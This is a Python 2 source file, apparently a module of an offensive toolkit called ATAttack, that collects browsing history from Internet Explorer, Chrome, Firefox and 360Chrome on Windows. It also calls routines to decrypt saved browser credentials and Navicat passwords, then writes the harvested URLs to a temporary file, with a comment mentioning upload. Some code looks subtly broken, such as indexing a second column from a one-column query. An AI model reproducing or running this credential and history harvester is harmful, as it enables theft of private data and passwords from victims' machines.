#! /usr/bin/env python2.7
# -*- coding: utf-8 -*-


import win32api
import win32con
from ATAttack.utility.decrypt import *
from ATAttack.framework.constant import constant
from ATAttack.enumeration.uninstall import query_results


command_list = []


class Software:

    def __init__(self,_server):
        self._server = _server
        print '[*] Running history finder'

    def getpatch(self, llsit):
        return list(set(llsit))

    def get_chrome_history(self):

        try:
            history_db = os.path.join(
                constant.profile['LOCALAPPDATA'],u'Google\Chrome\\User Data\Default\history')
            c = sqlite3.connect(history_db)
            cursor = c.cursor()
            select_statement = "SELECT urls.url FROM urls;"
            cursor.execute(select_statement)
            results = cursor.fetchall()
            for i in results:
                command_list.append(i[1])
            c.close()
            return command_list

        except Exception:
            return False

    def get_ie_history(self):

        reg_root = win32con.HKEY_CURRENT_USER
        reg_path = r"Software\\Microsoft\\Internet Explorer\\typedURLs"
        reg_flags = win32con.WRITE_OWNER | win32con.KEY_WOW64_64KEY | win32con.KEY_ALL_ACCESS
        key = win32api.RegOpenKeyEx(reg_root, reg_path, 0, reg_flags)
        try:
            i = 0
            while True:
                url = (win32api.RegEnumValue(key, i))
                command_list.append(url[1])
                i += 1
        except Exception:
            pass
        win32api.RegCloseKey(key)
        return command_list

    def get_Firefox_history(self):

        data_path = os.path.join(
            constant.profile['APPDATA'],u'Mozilla\\Firefox\\Profiles\\')
        fs = os.listdir(data_path)
        dict = []
        for f1 in fs:
            tmp_path = os.path.join(data_path, f1)
            if os.path.isdir(tmp_path):
                dict.append(tmp_path + r'\places.sqlite')
        for ct in dict:
            conn = sqlite3.connect(ct)
            c = conn.cursor()
            c.execute('select id, url, title from moz_places')
            results = c.fetchall()
            for i in results:
                command_list.append(i[1])
            c.close()
        return command_list

    def get_360c_history(self):
        try:
            history_db = os.path.join(
                constant.profile['LOCALAPPDATA'],u'360Chrome\\Chrome\\User Data\\Default\\history')
            if os.path.exists(history_db):
                c = sqlite3.connect(history_db)
                cursor = c.cursor()
                select_statement = "SELECT urls.url FROM urls;"
                cursor.execute(select_statement)
                results = cursor.fetchall()
                for i in results:
                    command_list.append(i[1])
                c.close()
                return list(set(command_list))
        except Exception:
            return False

    def run(self):

        Installation = query_results()
        output = decypt()
        print '[*] Finding histroy in ie'
        self.get_ie_history()
        output.ie_decrypt()
        # output.decrypt_using_netsh()
        if re.findall("Google+", Installation, re.S):
            print '[*] Finding histroy in Chrome'
            self.get_chrome_history()
            output.get_decypt_chrome()
        else:
            pass
        if re.findall("Mozilla+", Installation, re.S):
            print '[*] Finding histroy in Firefox'
            self.get_Firefox_history()
            output.send_firefox_data()
        else:
            pass
        print '[*] Finding histroy in 360Chrome'
        self.get_360c_history()
        output.get_decypt_360chrome()

        try:
            if re.findall('Navicat+', Installation, re.S):
                print "[*] Attempting to decrypt Navicat"
                self._server.navicatpwd()
        except Exception:
            pass
        # print_warning("Please wait while uploading ... ")
        log_tmp = list(set(command_list))
        for history in log_tmp:
            with open(constant.tmp_name, "a") as file:
                file.writelines(history + '\r\n')
            file.close()
        return log_tmp
